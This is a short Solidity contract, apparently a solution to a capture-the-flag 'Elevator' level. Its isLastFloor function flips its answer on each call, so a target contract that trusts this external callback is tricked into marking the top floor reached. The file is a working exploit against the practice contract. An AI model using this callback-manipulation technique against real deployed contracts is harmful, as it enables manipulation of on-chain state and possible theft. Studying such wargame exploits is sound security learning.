// SPDX-License-Identifier: MIT
pragma solidity ^0.8.15;

import "./Elevator.sol";

contract ElevatorAttacker {
    bool a = true;

    constructor() {}

    function attack(address targetAddress) external {
        Elevator target = Elevator(targetAddress);
        target.goTo(1);
    }

    function isLastFloor(uint256 floor) external returns (bool) {
        a = !a;
        return a;
    }
}
